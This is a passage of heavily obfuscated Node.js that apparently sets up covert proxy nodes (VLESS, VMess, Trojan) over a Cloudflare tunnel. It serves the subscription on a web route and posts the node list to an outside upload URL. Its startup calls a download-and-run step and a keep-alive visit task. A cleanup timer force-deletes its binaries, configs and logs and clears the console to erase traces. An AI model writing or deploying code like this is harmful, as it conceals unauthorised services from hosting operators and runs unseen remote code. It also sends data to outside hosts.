_0x2e96d3={_0x44b958:0x17c,_0x4bd4a3:0x129,_0x42c5f7:0x138,_0x42eb93:0x117},_0x3b4998=_0x321d,_0x490b7d={'v':'2','ps':''+_0x3bf234,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3b4998(0x18a),'net':'ws','type':_0x3b4998(_0x3c5433._0x48126d),'host':_0x47c660,'path':_0x3b4998(_0x3c5433._0x5590b1),'tls':_0x3b4998(0x160),'sni':_0x47c660,'alpn':'','fp':'firefox'},_0x267027=_0x3b4998(0x134)+UUID+'@'+CFIP+':'+CFPORT+_0x3b4998(_0x3c5433._0x53d8df)+_0x47c660+_0x3b4998(0x110)+_0x47c660+_0x3b4998(0x1ae)+_0x3bf234+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x3b4998(_0x3c5433._0x36d437)](_0x490b7d))[_0x3b4998(_0x3c5433._0x5dc2e9)](_0x3b4998(_0x3c5433._0xbfb4e5))+_0x3b4998(_0x3c5433._0xe8b0e1)+UUID+'@'+CFIP+':'+CFPORT+_0x3b4998(_0x3c5433._0x1c86b9)+_0x47c660+_0x3b4998(0x110)+_0x47c660+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3bf234+_0x3b4998(0x127);console[_0x3b4998(0x12a)](Buffer[_0x3b4998(0x17c)](_0x267027)['toString'](_0x3b4998(_0x3c5433._0xbfb4e5))),fs['writeFileSync'](subPath,Buffer[_0x3b4998(_0x3c5433._0x9a3e8f)](_0x267027)[_0x3b4998(_0x3c5433._0x507e74)]('base64')),console[_0x3b4998(0x12a)](FILE_PATH+_0x3b4998(_0x3c5433._0x514841)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5a2364,_0x253108)=>{const _0xc3271=_0x3b4998,_0xda3e38=Buffer[_0xc3271(_0x2e96d3._0x44b958)](_0x267027)[_0xc3271(_0x2e96d3._0x4bd4a3)](_0xc3271(_0x2e96d3._0x42c5f7));_0x253108[_0xc3271(_0x2e96d3._0x42eb93)](_0xc3271(0x13d),_0xc3271(0x179)),_0x253108[_0xc3271(0x18b)](_0xda3e38);}),_0x108961(_0x267027);},0x7d0);});}}async function uploadNodes(){const _0x17d8b7={_0x36b3ce:0x12a,_0x242fdf:0x17f,_0xfd4d5f:0xf6,_0x31e764:0xfd,_0x453c07:0x12c},_0x4f3323=_0x16466d;if(UPLOAD_URL&&PROJECT_URL){const _0x5a51c7=PROJECT_URL+'/'+SUB_PATH,_0x29fb88={'subscription':[_0x5a51c7]};try{const _0x47af3d=await axios[_0x4f3323(0xfd)](UPLOAD_URL+_0x4f3323(0x1a7),_0x29fb88,{'headers':{'Content-Type':_0x4f3323(0x176)}});return _0x47af3d&&_0x47af3d[_0x4f3323(0xf6)]===0xc8?(console[_0x4f3323(_0x17d8b7._0x36b3ce)]('Subscription\x20uploaded\x20successfully'),_0x47af3d):null;}catch(_0x2da936){if(_0x2da936['response']){if(_0x2da936[_0x4f3323(_0x17d8b7._0x242fdf)][_0x4f3323(_0x17d8b7._0xfd4d5f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x359b28=fs[_0x4f3323(0x171)](listPath,_0x4f3323(0x181)),_0x1e1a83=_0x359b28['split']('\x0a')[_0x4f3323(0x187)](_0x21e5c4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f3323(0x175)](_0x21e5c4));if(_0x1e1a83[_0x4f3323(0x12f)]===0x0)return;const _0x2e3ba8=JSON[_0x4f3323(0x14b)]({'nodes':_0x1e1a83});try{const _0x9bc6ef=await axios[_0x4f3323(_0x17d8b7._0x31e764)](UPLOAD_URL+_0x4f3323(_0x17d8b7._0x453c07),_0x2e3ba8,{'headers':{'Content-Type':'application/json'}});return _0x9bc6ef&&_0x9bc6ef['status']===0xc8?(console[_0x4f3323(0x12a)](_0x4f3323(0x158)),_0x9bc6ef):null;}catch(_0x32492c){return null;}}else return;}}function cleanFiles(){const _0x554998={_0x5acead:0x111};setTimeout(()=>{const _0x4c2281={_0x58c5af:0x152,_0x1e82b9:0x12a,_0x47bb95:0x18f},_0x3d39ca={_0x440129:0x12a,_0x277aff:0x19b},_0xc891c8=_0x321d,_0x184717=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x184717[_0xc891c8(_0x554998._0x5acead)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x184717['push'](phpPath);process[_0xc891c8(0xf5)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x184717[_0xc891c8(0x185)]('\x20')+_0xc891c8(0x166),_0x2987b4=>{const _0x56a080=_0xc891c8;console['clear'](),console[_0x56a080(_0x3d39ca._0x440129)](_0x56a080(_0x3d39ca._0x277aff)),console[_0x56a080(0x12a)](_0x56a080(0x18f));}):exec('rm\x20-rf\x20'+_0x184717[_0xc891c8(0x185)]('\x20')+_0xc891c8(0x188),_0x503dff=>{const _0xfce2ee=_0xc891c8;console[_0xfce2ee(_0x4c2281._0x58c5af)](),console['log'](_0xfce2ee(0x19b)),console[_0xfce2ee(_0x4c2281._0x1e82b9)](_0xfce2ee(_0x4c2281._0x47bb95));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xdef16b={_0x2d2190:0x12a,_0x346dbb:0xfd,_0x4c5d1b:0x176,_0x559c9c:0x12a,_0x2ca2de:0x13b,_0x27304f:0x102},_0x28f5b8=_0x16466d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x28f5b8(_0xdef16b._0x2d2190)](_0x28f5b8(0x10c));return;}try{const _0x4c8de0=await axios[_0x28f5b8(_0xdef16b._0x346dbb)](_0x28f5b8(0xf4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x28f5b8(_0xdef16b._0x4c5d1b)}});return console[_0x28f5b8(_0xdef16b._0x559c9c)](_0x28f5b8(0x108)),_0x4c8de0;}catch(_0x39a805){return console[_0x28f5b8(0x16a)](_0x28f5b8(_0xdef16b._0x2ca2de)+_0x39a805[_0x28f5b8(_0xdef16b._0x27304f)]),null;}}async function startserver(){const _0x526cec=_0x16466d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1c2689){console[_0x526cec(0x16a)]('Error\x20in\x20startserver:',_0x1c2689);}}startserver()[_0x16466d(0x184)](_0x3d128f=>{const _0x30df0e=_0x16466d;console[_0x30df0e(0x16a)](_0x30df0e(0x15d),_0x3d128f);}),app[_0x16466d(0x172)](PORT,()=>console[_0x16466d(0x12a)](_0x16466d(0x10a)+PORT+'!'));
